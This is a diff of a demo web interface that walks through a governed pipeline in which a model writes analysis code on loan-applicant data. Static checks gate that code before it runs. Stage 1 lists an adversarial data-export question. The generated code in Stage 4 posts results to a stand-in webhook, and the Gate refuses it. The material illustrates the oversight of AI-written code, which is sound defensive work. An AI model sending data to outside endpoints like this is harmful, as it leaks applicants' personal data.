+  .pcard .ptier { position:absolute; top:16px; right:16px; font-family:var(--mono); font-size:11px; font-weight:700; padding:3px 8px; border-radius:8px; background:rgba(91,141,239,.16); border:1px solid #2f4d7e; color:#9dc0f5; }
+  .pcard.hero { border-color:#3f6bb0; background:rgba(91,141,239,.1); }
+  .pcard .phero-tag { display:block; margin-top:11px; font-size:10px; font-weight:700; letter-spacing:.06em; text-transform:uppercase; color:#5fdc8a; }
+  .login-foot { color:var(--rail-muted); font-size:11.5px; margin-top:26px; }
+
+  /* identity banner (shown when the viewer is not the L2 Analyst) */
+  .idbanner { margin-bottom:16px; }
+  .idbanner-in { display:flex; gap:10px; align-items:flex-start; padding:9px 13px; border-radius:var(--r-md); font-size:12.5px; border:1px solid var(--warn-border); background:var(--warn-soft); color:var(--warn-ink); }
+  .idbanner-in .m { font-weight:800; }
+
+  /* stage transition overlay */
+  .transition { position:fixed; inset:0; z-index:70; display:flex; align-items:center; justify-content:center; background:color-mix(in srgb, var(--canvas) 55%, transparent); backdrop-filter:blur(3px); opacity:0; pointer-events:none; transition:opacity .16s ease; }
+  .transition.show { opacity:1; pointer-events:auto; }
+  .trans-card { display:flex; align-items:center; gap:15px; background:var(--surface); border:1px solid var(--border); border-radius:var(--r-md); box-shadow:var(--shadow-md); padding:16px 22px; }
+  .spinner { width:26px; height:26px; border-radius:50%; border:2.5px solid var(--border); border-top-color:var(--accent); animation:spin .7s linear infinite; flex:none; }
+  @keyframes spin { to { transform:rotate(360deg); } }
+  .trans-verb { font-size:14px; font-weight:700; }
+  .trans-msg { font-size:12.5px; color:var(--muted); margin-top:1px; }
+  @media (prefers-reduced-motion: reduce){ .spinner { animation:none; } .transition, .pcard { transition:none; } }
+
+  /* ================= APP SHELL (persistent sidebar on every screen) ================= */
+  .shell { display:grid; grid-template-columns:238px minmax(0,1fr); grid-template-rows:auto 1fr; min-height:100vh; }
+  .shell > .topbar { grid-column:1 / -1; position:sticky; top:0; z-index:40; }
+  .sidenav { grid-column:1; grid-row:2; position:sticky; top:var(--topbar-h,54px); align-self:start; max-height:calc(100vh - var(--topbar-h,54px)); overflow-y:auto; background:var(--chrome-bg-2); border-right:1px solid var(--chrome-border); color:var(--chrome-ink); padding:16px 10px 30px; }
+  .content { grid-column:2; grid-row:2; min-width:0; }
+  .navgroup { margin-bottom:14px; }
+  .navgroup .gl { font-size:9.5px; font-weight:700; letter-spacing:.11em; text-transform:uppercase; color:var(--chrome-muted); padding:0 10px; margin-bottom:6px; }
+  .navitem { display:flex; align-items:center; gap:10px; width:100%; text-align:left; background:transparent; border:1px solid transparent; border-radius:9px; padding:9px 11px; color:var(--chrome-muted); font-size:13.5px; font-weight:600; white-space:nowrap; font-family:inherit; cursor:pointer; }
+  .navitem:hover { background:var(--chrome-hover); color:var(--chrome-ink); }
+  .navitem.active { background:var(--chrome-abg); color:var(--chrome-aink); border-color:var(--chrome-aborder); }
+  .navitem .ic { width:17px; height:17px; flex:none; opacity:.9; }
+  .navitem .ic svg { width:17px; height:17px; display:block; }
+  .navitem .cnt { margin-left:auto; font-family:var(--mono); font-size:10.5px; font-weight:700; color:var(--chrome-muted); background:var(--chrome-bg); border:1px solid var(--chrome-border); border-radius:6px; padding:0 6px; }
+
+  .view { display:none; }
+  .view.show { display:block; }
+  .surfwrap { max-width:1040px; margin:0 auto; padding:24px 30px 60px; }
+  .surfhead { margin-bottom:14px; }
+  .h2 { font-size:22px; margin-bottom:5px; }
+  .lede { color:var(--muted); font-size:14px; max-width:72ch; }
+  .subsec { margin-top:22px; }
+  .subsec > .eyebrow { display:block; margin-bottom:9px; }
+  .rowflex { display:flex; gap:14px; flex-wrap:wrap; }
+  .rowflex > * { flex:1; min-width:230px; }
+  .breakrow { display:flex; gap:7px; flex-wrap:wrap; }
+
+  /* classification chips */
+  .cls { font-size:10px; font-weight:800; padding:2px 7px; border-radius:5px; letter-spacing:.03em; text-transform:uppercase; }
+  .cls.public { background:var(--ok-soft); color:var(--ok-ink); border:1px solid var(--ok-border); }
+  .cls.internal { background:var(--accent-soft); color:var(--accent); border:1px solid var(--accent-soft-border); }
+  .cls.confidential { background:var(--warn-soft); color:var(--warn-ink); border:1px solid var(--warn-border); }
+  .cls.restricted { background:var(--danger-soft); color:var(--danger-ink); border:1px solid var(--danger-border); }
+  tbody tr.rowbad td { background:var(--danger-soft); }
+  tbody tr.rowgood td:first-child { box-shadow:inset 3px 0 0 var(--ok); }
+  .note .m { flex:none; font-weight:800; }
+
+  /* metrics + charts */
+  .metrics { display:grid; grid-template-columns:repeat(4,1fr); gap:12px; }
+  .metric { background:var(--surface); border:1px solid var(--border); border-radius:var(--r-md); padding:14px 15px; }
+  .metric .mv { font-size:26px; font-weight:700; font-variant-numeric:tabular-nums; line-height:1.05; }
+  .metric .ml { font-size:11.5px; font-weight:700; color:var(--muted); margin-top:6px; text-transform:uppercase; letter-spacing:.04em; }
+  .metric .md { font-size:11px; color:var(--faint); margin-top:3px; }
+  .barchart { display:flex; align-items:flex-end; gap:14px; height:120px; padding:18px 6px 0; }
+  .barchart .bcol { flex:1; display:flex; flex-direction:column; align-items:center; justify-content:flex-end; height:100%; gap:6px; }
+  .barchart .bar { width:100%; max-width:60px; background:linear-gradient(180deg,var(--accent),var(--accent-strong)); border-radius:5px 5px 0 0; position:relative; min-height:4px; }
+  .barchart .bar .v { position:absolute; top:-17px; left:0; right:0; text-align:center; font-family:var(--mono); font-size:11px; font-weight:700; }
+  .barchart .bcap { font-family:var(--mono); font-size:10.5px; color:var(--muted); }
+
+  /* command-center dashboard (landing) */
+  .dash { max-width:1120px; margin:0 auto; padding:24px 30px 60px; }
+  .dashhead { margin-bottom:20px; }
+  .cta-run { display:flex; align-items:center; gap:16px; background:var(--surface); border:1px solid var(--border-strong); box-shadow:var(--shadow-md); color:var(--ink); border-radius:var(--r-lg); padding:20px 24px; margin-bottom:20px; flex-wrap:wrap; }
+  .cta-run .cta-t { font-size:18px; font-weight:650; color:var(--ink); }
+  .cta-run .cta-d { font-size:12.5px; color:var(--muted); margin-top:3px; }
+  .cta-run .spacer { flex:1; min-width:20px; }
+  .btn.lg { padding:13px 22px; font-size:15px; border-radius:var(--r-md); }
+  .tilegrid { display:grid; grid-template-columns:repeat(2,1fr); gap:16px; }
+  .tile { text-align:left; background:var(--surface); border:1px solid var(--border); border-radius:var(--r-lg); box-shadow:var(--shadow-sm); padding:0; overflow:hidden; display:flex; flex-direction:column; }
+  .tile-h { display:flex; align-items:center; gap:10px; padding:14px 18px; border-bottom:1px solid var(--border); }
+  .tile-h .ic { width:19px; height:19px; color:var(--accent); flex:none; }
+  .tile-h .ic svg { width:19px; height:19px; display:block; }
+  .tile-h h3 { font-size:15px; }
+  .tile-h .open { margin-left:auto; font-size:12px; font-weight:600; color:var(--accent); background:transparent; border:0; cursor:pointer; }
+  .tile-h .open:hover { text-decoration:underline; }
+  .tile-b { padding:16px 18px; flex:1; }
+  .tile-stat { display:flex; align-items:baseline; gap:9px; }
+  .tile-stat .big { font-size:30px; font-weight:700; font-variant-numeric:tabular-nums; line-height:1; }
+  .tile-stat .unit { font-size:12.5px; color:var(--muted); }
+</style>
+</head>
+<body>
+<div class="shell">
+  <div class="topbar">
+    <div class="brand">
+      <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2 4 5v6c0 5 3.4 8.5 8 11 4.6-2.5 8-6 8-11V5z" fill="#2f6fd0"/><path d="M8 12l3 3 5-6" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      <span class="wm">SENTINEL</span>
+      <span class="sub">Governed Agentic Analysis</span>
+    </div>
+    <div class="spacer"></div>
+    <div class="ctx">
+      <button class="ctx-chip persona" id="persona-chip" onclick="openControls()" title="Who is running this, and what they may do"><span class="dot" style="background:#5fdc8a"></span><span class="k">Analyst</span> certified</button>
+      <button class="ctx-chip" onclick="goRun(1,1)" title="Dataset and classification"><span class="k">Data</span> german_credit <span class="badge danger" style="padding:1px 6px;font-size:10px">Restricted</span></button>
+      <button class="ctx-chip purpose" onclick="goRun(1,2)" title="Purpose limitation"><span class="k">Purpose</span> Fair-lending review</button>
+      <button class="ctx-chip tier" onclick="openCtl('CTL-TIER-01')" title="How the tier is computed"><span class="k">Tier</span> <span class="tier-badge" id="tier-badge">L2</span></button>
+      <button class="iconbtn" onclick="goStack()" aria-label="Jump to the architecture overview">&#9638; Stack</button>
+      <button class="iconbtn" onclick="openControls()" aria-label="Open control panel">&#9639; Controls</button>
+      <button class="iconbtn" onclick="toggleTheme()" aria-label="Toggle theme" aria-pressed="false" id="themebtn">&#9681;</button>
+    </div>
+  </div>
+
+  <nav class="sidenav" id="sidenav" aria-label="Sections"></nav>
+
+  <div class="content" id="content">
+  <h1 class="sr-only">Sentinel — Governed Agentic Analysis</h1>
+
+  <!-- LANDING: governance command center (the tile dashboard) -->
+  <div class="view show" id="view-home">
+    <div class="dash">
+      <div class="dashhead">
+        <div class="eyebrow">Governance command center</div>
+        <h2 class="h2" style="margin-top:6px">The whole governed platform, at a glance</h2>
+        <p class="lede">Every surface is a live tile: data under classification, analyses under certification, agents under templates, adoption trending up. Start a governed run and watch one request flow through all of it.</p>
+      </div>
+      <div class="cta-run">
+        <div>
+          <div class="cta-t">Start a governed run</div>
+          <div class="cta-d">german_credit &middot; fair-lending review &middot; resolves to L2 &middot; nine controls arm before any code runs</div>
+        </div>
+        <div class="spacer"></div>
+        <button class="btn primary lg" onclick="startRun()">Launch walkthrough &rarr;</button>
+      </div>
+      <div class="tilegrid" id="tilegrid"></div>
+    </div>
+  </div>
+
+  <!-- RUN: the nine-stage governed walkthrough (sidebar stays visible) -->
+  <div class="view" id="view-run">
+  <nav class="rail" aria-label="Pipeline stages"><div class="rail-inner" id="rail"></div></nav>
+
+<main class="stage-wrap" id="stagewrap" aria-label="Governed run walkthrough">
+  <div class="idbanner" id="idbanner" style="display:none"><div class="idbanner-in" id="idbanner-in"></div></div>
+  <div class="enginebar" id="enginebar"></div>
+
+  <!-- STAGE 1 : ASK -->
+  <section class="panel" id="stage-1" aria-labelledby="h1">
+    <div class="phead">
+      <div class="eyebrow"><span>Stage 1 of 9</span><span class="badge neutral">Bind &amp; scope</span></div>
+      <h2 id="h1">Ask</h2>
+      <p class="lede">The request is bound to an identity and scoped before any data is touched. Three explicit steps: what data, for what purpose, to answer which question. The tier is then computed, never chosen.</p>
+    </div>
+    <div class="iodid">
+      <div class="iocard"><div class="k">In</div><div class="v">Free choice of dataset, purpose, question</div></div>
+      <div class="iocard does"><div class="k">Does</div><div class="v">Binds identity, classifies the question, computes the autonomy tier</div></div>
+      <div class="iocard"><div class="k">Out</div><div class="v">A frozen request at tier <b>L2</b>. The tier cannot change mid-request.</div></div>
+    </div>
+
+    <div class="substeps" id="asksubs">
+      <button class="substep active" data-sub="1" onclick="showSub(1)"><span class="n">1</span><span><span class="t">Import dataset</span><span class="d">Choose and classify</span></span></button>
+      <button class="substep" data-sub="2" onclick="showSub(2)"><span class="n">2</span><span><span class="t">Select purpose</span><span class="d">Why this data is used</span></span></button>
+      <button class="substep" data-sub="3" onclick="showSub(3)"><span class="n">3</span><span><span class="t">Pick question</span><span class="d">Pre-built, no free text</span></span></button>
+    </div>
+
+    <!-- sub 1: dataset -->
+    <div class="subpane show" id="sub-1">
+      <div class="card">
+        <div class="card-h"><h3>Dataset catalogue</h3><span class="eyebrow">Classification drives the ceiling</span></div>
+        <div class="card-b">
+          <div class="tbl-wrap">
+            <table>
+              <thead><tr><th>Dataset</th><th>Class</th><th>Fair lending</th><th>Credit risk</th><th class="num">Rows</th><th>Tier ceiling</th></tr></thead>
+              <tbody>
+                <tr class="row-sel"><td><b>german_credit</b> &nbsp;<span class="badge info">selected</span></td><td><span class="badge danger">Restricted</span></td><td><span class="badge ok">permitted</span></td><td><span class="badge ok">permitted</span></td><td class="num">1,000</td><td class="mono">L2</td></tr>
+                <tr><td>uci_taiwan_credit</td><td><span class="badge danger">Restricted</span></td><td><span class="badge ok">permitted</span></td><td><span class="badge ok">permitted</span></td><td class="num">30,000</td><td class="mono">L2</td></tr>
+                <tr><td>synthetic_its</td><td><span class="badge ok">Public</span></td><td><span class="badge ok">permitted</span></td><td><span class="badge ok">permitted</span></td><td class="num">365</td><td class="mono">L3</td></tr>
+                <tr><td>berka</td><td><span class="badge warn">Confidential</span></td><td><span class="badge danger">refused</span></td><td><span class="badge ok">permitted</span></td><td class="num">1,090,086</td><td class="mono">L1</td></tr>
+              </tbody>
+            </table>
+          </div>
+          <div class="note info" style="margin-top:14px"><span class="ico">i</span><div><b>german_credit</b> is Restricted-class (UCI Statlog, 1,000 loan applicants, CC BY&nbsp;4.0). Restricted data caps machine autonomy at <b>L2</b>. That ceiling is one half of the tier calculation completed at the end of this stage.</div></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- sub 2: purpose -->
+    <div class="subpane" id="sub-2">
+      <div class="card">
+        <div class="card-h"><h3>Purpose limitation</h3><span class="eyebrow">Checked at Access &middot; <span class="mono">CTL-PURP-01</span></span></div>
+        <div class="card-b">
+          <p style="font-size:13px;color:var(--muted);margin-bottom:12px">A dataset is not a blank cheque. Each purpose is separately permitted or refused for <b>german_credit</b>. The reason for the request, not just who is asking, gates access.</p>
+          <div class="pmatrix">
+            <div class="pcell allow sel"><span class="mk">&#10003;</span> Fair-lending review <span class="badge info" style="margin-left:4px">selected</span></div>
+            <div class="pcell allow"><span class="mk">&#10003;</span> Credit-risk model</div>
+            <div class="pcell allow"><span class="mk">&#10003;</span> Data quality</div>
+            <div class="pcell deny"><span class="mk">&#10007;</span> Fraud detection</div>
+            <button class="pcell deny showpiece" onclick="openCtl('CTL-PURP-01')" title="See why this is refused"><span class="mk">&#10007;</span> Marketing <span class="badge danger" style="margin-left:4px">refused</span></button>
+            <div class="pcell deny"><span class="mk">&#10007;</span> Causal impact</div>
+          </div>
+          <div class="note warn" style="margin-top:14px"><span class="ico">!</span><div>Choosing <b>Marketing</b> would refuse the run at Access under <span class="mono">CTL-PURP-01</span>, before any code is generated. Credit-decision data may not be repurposed for marketing. <button class="ctl block" style="margin-left:4px" onclick="openCtl('CTL-PURP-01')"><span class="st"></span>CTL-PURP-01</button></div></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- sub 3: question -->
+    <div class="subpane" id="sub-3">
+      <div class="card">
+        <div class="card-h"><h3>Pick a question</h3><span class="eyebrow">Pre-built for the demo</span></div>
+        <div class="card-b">
+          <div class="opts">
+            <div class="opt sel"><span class="radio"></span><div><div class="ot">Does the model decline older applicants more often, holding income constant?</div><div class="od">Fair-lending disparity by age band. The hero question.</div></div></div>
+            <div class="opt"><span class="radio"></span><div><div class="ot">What is the approval-rate gap between the youngest and oldest bands?</div><div class="od">A narrower cut of the same fairness lens.</div></div></div>
+            <div class="opt"><span class="radio"></span><div><div class="ot">Export every applicant record with contact details to an external endpoint.</div><div class="od">Adversarial. Survives generation, then is caught at the Gate (network egress). <button class="ctl block" onclick="openCtl('CTL-EGRESS-01')"><span class="st"></span>CTL-EGRESS-01</button></div></div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="card" style="margin-top:16px">
+      <div class="card-h"><h3>Tier resolution</h3><span class="eyebrow">Computed, never chosen</span></div>
+      <div class="card-b">
+        <div class="grid2">
+          <div>
+            <div class="section-label">The lower of two ceilings</div>
+            <dl class="kv">
+              <dt>Data classification</dt><dd>Restricted &rarr; ceiling <b class="mono">L2</b></dd>
+              <dt>Person (role + attestations)</dt><dd>Data scientist + certified &rarr; ceiling <b class="mono">L2</b></dd>
+            </dl>
+            <hr class="hr" />
+            <div style="display:flex;align-items:center;gap:12px">
+              <span class="mono" style="font-size:13px;color:var(--muted)">min(L2, L2)</span>
+              <span style="color:var(--faint)">=</span>
+              <span class="badge info" style="font-size:15px;padding:6px 14px"><b class="mono">L2</b></span>
+            </div>
+            <p style="font-size:12.5px;color:var(--muted);margin-top:12px">At L2 the model writes code against a fenced API, reviewed before it runs. A read-only role would land at L0 and could not run; L3 needs a sandbox waiver on Public data only.</p>
+          </div>
+          <div>
+            <div class="section-label">Controls armed at Ask</div>
+            <div class="ctls">
+              <button class="ctl pass" onclick="openCtl('CTL-TIER-01')"><span class="st"></span>CTL-TIER-01<span class="i">i</span></button>
+              <button class="ctl armed" onclick="openCtl('CTL-PURP-01')"><span class="st"></span>CTL-PURP-01<span class="i">i</span></button>
+            </div>
+            <div class="note ok" style="margin-top:14px"><span class="ico">&#10003;</span><div>Identity bound to <span class="mono">analyst</span>. Question classified as a fairness query. Request frozen at <b>L2</b>. No data has been read yet.</div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- STAGE 2 : PLAN -->
+  <section class="panel" id="stage-2" aria-labelledby="h2h">
+    <div class="phead">
+      <div class="eyebrow"><span>Stage 2 of 9</span><span class="badge neutral">Select certified analysis</span></div>
+      <h2 id="h2h">Plan</h2>
+      <p class="lede">The model may only select a pre-certified analysis. A draft agent is invisible to planning. The chosen analysis is bound to the exact dataset fingerprint it was certified against.</p>
+    </div>
+    <div class="iodid">
+      <div class="iocard"><div class="k">In</div><div class="v">The frozen request</div></div>
+      <div class="iocard does"><div class="k">Does</div><div class="v">Picks a certified registry entry; checks the data contract for drift</div></div>
+      <div class="iocard"><div class="k">Out</div><div class="v">A chosen analysis + parameters</div></div>
+    </div>
+
+    <div class="grid2">
+      <div class="card">
+        <div class="card-h"><h3>Selected analysis</h3><span class="badge ok">certified</span></div>
+        <div class="card-b">
+          <div style="font-size:16px;font-weight:650;margin-bottom:2px">fair-lending <span class="mono" style="color:var(--muted);font-weight:600">v1.4</span></div>
+          <p style="font-size:12.5px;color:var(--muted);margin-bottom:12px">Selection-rate disparity by age band, income-adjusted.</p>
+          <dl class="kv">
+            <dt>Author</dt><dd class="mono">priya.raman</dd>
+            <dt>Owner</dt><dd class="mono">dana.okafor <span class="badge ok" style="font-size:10px">named person</span></dd>
+            <dt>Validator</dt><dd class="mono">sam.mendes <span class="badge ok" style="font-size:10px">independent</span></dd>
+            <dt>Faithfulness</dt><dd class="mono">0.94 <span style="color:var(--ok-ink)">&#10003; &ge; 0.90</span></dd>
+          </dl>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-h"><h3>Data contract</h3><span class="eyebrow"><span class="mono">CTL-CONTRACT-01</span></span></div>
+        <div class="card-b">
+          <p style="font-size:12.5px;color:var(--muted);margin-bottom:12px">The analysis is pinned to the dataset fingerprint it was certified against. If the data drifted, the certification would describe data that no longer exists.</p>
+          <dl class="kv">
+            <dt>Certified SHA</dt><dd class="mono">4f2a1c9e</dd>
+            <dt>Current SHA</dt><dd class="mono">4f2a1c9e</dd>
+          </dl>
+          <div class="note ok" style="margin-top:12px"><span class="ico">&#10003;</span><div><b>Pinned.</b> Fingerprints match. <button class="ctl pass" onclick="openCtl('CTL-CONTRACT-01')"><span class="st"></span>CTL-CONTRACT-01</button> <span style="opacity:.85">On static demo data, drift cannot fire; flip a byte of the CSV and it would refuse.</span></div></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-h"><h3>Not selectable</h3><span class="eyebrow">Draft &amp; failing entries are invisible to planning</span></div>
+      <div class="card-b">
+        <div class="opt disabled">
+          <span class="radio"></span>
+          <div style="flex:1">
+            <div class="ot">cohort-retention <span class="mono" style="color:var(--muted);font-weight:600">v0.3</span> <span class="badge neutral">draft</span></div>
+            <div class="od">Refused certification on two independent grounds, so the model cannot plan with it:</div>
+            <div class="ctls" style="margin-top:9px">
+              <button class="ctl block" onclick="openCtl('CTL-EVAL-01')"><span class="st"></span>CTL-EVAL-01</button>
+              <span style="font-size:12px;color:var(--muted)">faithfulness 0.72, below the 0.90 floor</span>
+            </div>
+            <div class="ctls" style="margin-top:6px">
+              <button class="ctl block" onclick="openCtl('CTL-SOD-01')"><span class="st"></span>CTL-SOD-01</button>
+              <span style="font-size:12px;color:var(--muted)">no independent validator assigned</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-h"><h3>Parameters</h3><span class="eyebrow">pre-filled with defaults &middot; click through</span></div>
+      <div class="card-b">
+        <p style="font-size:12.5px;color:var(--muted);margin-bottom:14px">The analysis exposes typed parameters. Defaults are populated from the certified spec, so the analyst can accept them and advance without editing anything.</p>
+        <div class="grid2">
+          <div>
+            <div class="section-label">Grouping</div>
+            <dl class="kv">
+              <dt>Age-band cut</dt><dd class="mono">decade (18-25 &hellip; 71-75)</dd>
+              <dt>Income control</dt><dd class="mono">credit_amount (adjusted)</dd>
+              <dt>Protected attribute</dt><dd class="mono">age_band</dd>
+            </dl>
+          </div>
+          <div>
+            <div class="section-label">Disclosure &amp; reporting</div>
+            <dl class="kv">
+              <dt>Min cell floor</dt><dd class="mono">10</dd>
+              <dt>Proxy threshold &eta;</dt><dd class="mono">0.50</dd>
+              <dt>Confidence level</dt><dd class="mono">95%</dd>
+            </dl>
+          </div>
+        </div>
+        <div class="note info" style="margin-top:14px"><span class="ico">i</span><div>These are typed and bounded, not free text. At tier <b>L1</b> this form is the whole interaction (the model fills it, writes no code); at <b>L2</b> it seeds the generation you will see next.</div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- STAGE 3 : ACCESS -->
+  <section class="panel" id="stage-3" aria-labelledby="h3h">
+    <div class="phead">
+      <div class="eyebrow"><span>Stage 3 of 9</span><span class="badge neutral">Scope the data</span></div>
+      <h2 id="h3h">Access</h2>
+      <p class="lede">A policy-scoped view is built by construction. Columns the request may not see are not hidden, they are absent from the object handed downstream. Here they are shown, struck out and masked, so you can see exactly what was withheld and why.</p>
+    </div>
+    <div class="iodid">
+      <div class="iocard"><div class="k">In</div><div class="v">Analysis + granted column list</div></div>
+      <div class="iocard does"><div class="k">Does</div><div class="v">Resolves the column grant, applies an identity row filter</div></div>
+      <div class="iocard"><div class="k">Out</div><div class="v">A scoped table &mdash; denied columns do not exist on it</div></div>
+    </div>
+
+    <div class="card">
+      <div class="card-h"><h3>Scoped table</h3><span class="eyebrow">6 granted &middot; rest withheld</span></div>
+      <div class="card-b">
+        <div class="tbl-wrap">
+          <table>
+            <thead><tr>
+              <th>age_band</th><th class="num">credit_amount</th><th class="num">duration_months</th><th class="num">digital_engagement_score</th><th class="num">y</th><th class="num">pred</th>
+              <th class="col-denied">applicant_email</th><th class="col-denied">applicant_ssn</th><th class="col-denied">personal_status_sex</th>
+            </tr></thead>
+            <tbody>
+              <tr><td>26-35</td><td class="num">3,914</td><td class="num">24</td><td class="num">67.4</td><td class="num">1</td><td class="num">0</td><td class="cell-mask">&#9679;&#9679;&#9679;&#9679;</td><td class="cell-mask">&#9679;&#9679;&#9679;</td><td class="cell-mask">&#9679;&#9679;&#9679;</td></tr>
+              <tr><td>46-55</td><td class="num">2,278</td><td class="num">12</td><td class="num">49.1</td><td class="num">1</td><td class="num">1</td><td class="cell-mask">&#9679;&#9679;&#9679;&#9679;</td><td class="cell-mask">&#9679;&#9679;&#9679;</td><td class="cell-mask">&#9679;&#9679;&#9679;</td></tr>
+              <tr><td>18-25</td><td class="num">1,209</td><td class="num">6</td><td class="num">78.2</td><td class="num">0</td><td class="num">0</td><td class="cell-mask">&#9679;&#9679;&#9679;&#9679;</td><td class="cell-mask">&#9679;&#9679;&#9679;</td><td class="cell-mask">&#9679;&#9679;&#9679;</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <div class="legend">
+          <span><span class="st" style="background:var(--ink)"></span>granted columns are present and readable</span>
+          <span><span class="st" style="background:var(--danger)"></span>denied columns: header struck, data masked, never handed downstream</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-h"><h3>Why each column was withheld</h3></div>
+      <div class="card-b">
+        <div class="tbl-wrap">
+          <table>
+            <thead><tr><th>Column</th><th>Reason withheld</th><th>Control</th></tr></thead>
+            <tbody>
+              <tr><td><span class="col-denied">applicant_email</span></td><td>Direct PII. Denied to every role and redacted before any model context.</td><td><button class="ctl block" onclick="openCtl('CTL-PII-01')"><span class="st"></span>CTL-PII-01</button></td></tr>
+              <tr><td><span class="col-denied">applicant_ssn</span></td><td>Direct PII. Denied to every role.</td><td><button class="ctl block" onclick="openCtl('CTL-PII-01')"><span class="st"></span>CTL-PII-01</button></td></tr>
+              <tr><td><span class="col-denied">personal_status_sex</span></td><td>Protected-attribute proxy for sex. Outside the fair-lending grant.</td><td><button class="ctl block" onclick="openCtl('CTL-RBAC-01')"><span class="st"></span>CTL-RBAC-01</button></td></tr>
+              <tr><td><span style="color:var(--muted)">+ 13 more columns</span></td><td>Checking status, credit history, savings, employment, housing, job, and others: outside the column scope this purpose grants.</td><td><button class="ctl armed" onclick="openCtl('CTL-PURP-02')"><span class="st"></span>CTL-PURP-02</button></td></tr>
+            </tbody>
+          </table>
+        </div>
+        <div class="note info" style="margin-top:14px"><span class="ico">i</span><div>The identity row-filter control also ran and logged. For german_credit the predicate is empty (no natural per-identity split), so it is informational here; where a dataset needs one, the filter is injected <b>after</b> generation so the model cannot remove it. <button class="ctl pass" onclick="openCtl('CTL-RBAC-02')"><span class="st"></span>CTL-RBAC-02</button> Purpose permitted: fair-lending. <button class="ctl pass" onclick="openCtl('CTL-PURP-01')"><span class="st"></span>CTL-PURP-01</button></div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- STAGE 4 : GENERATE -->
+  <section class="panel" id="stage-4" aria-labelledby="h4h">
+    <div class="phead">
+      <div class="eyebrow"><span>Stage 4 of 9</span><span class="badge neutral">Model writes code</span></div>
+      <h2 id="h4h">Generate</h2>
+      <p class="lede">The model writes code against the fenced API. Generating is not dangerous; running is. The code is produced here and executed nowhere. The first draft below reaches for a network call, which the next stage will catch.</p>
+    </div>
+    <div class="iodid">
+      <div class="iocard"><div class="k">In</div><div class="v">Question, analysis spec, granted columns</div></div>
+      <div class="iocard does"><div class="k">Does</div><div class="v">Writes Python against the <span class="mono">ctx</span> API</div></div>
+      <div class="iocard"><div class="k">Out</div><div class="v">A code string, unexecuted</div></div>
+    </div>
+    <div class="card">
+      <div class="card-h"><h3>Generated code</h3><span class="eyebrow">Attempt 1 &middot; <span class="badge warn">live-LLM</span></span></div>
+      <div class="card-b">
+        <div class="code"><table><tbody>
+          <tr><td class="ln">1</td><td><span class="kw">def</span> <span class="fn">analysis</span>(ctx):</td></tr>
+          <tr><td class="ln">2</td><td>    <span class="cm"># selection rate by age band, income-adjusted</span></td></tr>
+          <tr><td class="ln">3</td><td>    rates = ctx.<span class="fn">sql</span>(<span class="st">"""</span></td></tr>
+          <tr><td class="ln">4</td><td>        <span class="st">SELECT age_band, AVG(pred) AS selection_rate, COUNT(*) AS n</span></td></tr>
+          <tr><td class="ln">5</td><td>        <span class="st">FROM german_credit GROUP BY age_band ORDER BY age_band"""</span>)</td></tr>
+          <tr><td class="ln">6</td><td>    ctx.<span class="fn">emit</span>(rates)</td></tr>
+          <tr class="viol"><td class="ln">7</td><td>    requests.<span class="fn">post</span>(<span class="st">"https://hooks.example.net/collect"</span>, json=rates) <span class="viol-tag"># &larr; CTL-EGRESS-01</span></td></tr>
+        </tbody></table></div>
+        <div class="note info" style="margin-top:14px"><span class="ico">i</span><div>No control refuses at Generate. The webhook on line 7 is real, not staged. It is the Gate, next, that reads intent before the machine acts.</div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- STAGE 5 : GATE -->
+  <section class="panel" id="stage-5" aria-labelledby="h5h">
+    <div class="phead">
+      <div class="eyebrow"><span>Stage 5 of 9</span><span class="badge neutral">Read before run</span></div>
+      <h2 id="h5h">Gate</h2>
+      <p class="lede">Two static parsers walk the code. Nothing runs, nothing imports. A gate tells you what was intended, before it happens, in language a control tester can read.</p>
+    </div>
+    <div class="iodid">
+      <div class="iocard"><div class="k">In</div><div class="v">The code string</div></div>
+      <div class="iocard does"><div class="k">Does</div><div class="v">Parses and walks it with <span class="mono">ast</span> + <span class="mono">sqlglot</span></div></div>
+      <div class="iocard"><div class="k">Out</div><div class="v">Pass, or a refusal naming the control and line</div></div>
+    </div>
+
+    <div class="grid2" style="margin-bottom:16px">
+      <div class="card"><div class="card-b"><div class="section-label"><span class="mono">ast</span> &middot; reads the Python</div><p style="font-size:12.5px;color:var(--muted)">Imports, network egress, dynamic exec, filesystem writes, dunder escapes.</p></div></div>
+      <div class="card"><div class="card-b"><div class="section-label"><span class="mono">sqlglot</span> &middot; reads the SQL</div><p style="font-size:12.5px;color:var(--muted)">Column references, <span class="mono">SELECT *</span>, join shape, Cartesian products.</p></div></div>
+    </div>
+
+    <div class="card" id="gate-attempt1">
+      <div class="card-h"><h3>Verdict</h3><span class="badge danger">1 violation</span></div>
+      <div class="card-b">
+        <div class="note danger"><span class="ico">&#10007;</span><div><b>Refused at line 7.</b> The generated code references a network module and would send the result to an external endpoint. <button class="ctl block" onclick="openCtl('CTL-EGRESS-01')"><span class="st"></span>CTL-EGRESS-01</button> caught it even though the code never imported the library.</div></div>
+        <div style="display:flex;align-items:center;gap:12px;margin-top:16px;flex-wrap:wrap">
+          <button class="btn primary" id="fixbtn" onclick="fixIt()">&#9881; Fix it &mdash; regenerate with the failure fed back</button>
+          <span style="font-size:12px;color:var(--muted)">up to 3 attempts, then handed to a human</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="card" id="gate-attempt2" style="display:none">
+      <div class="card-h"><h3>Verdict</h3><span class="badge ok">cleared</span></div>
+      <div class="card-b">
+        <div class="code" style="margin-bottom:14px"><table><tbody>
+          <tr><td class="ln">1</td><td><span class="kw">def</span> <span class="fn">analysis</span>(ctx):</td></tr>
+          <tr><td class="ln">2</td><td>    <span class="cm"># selection rate by age band, income-adjusted</span></td></tr>
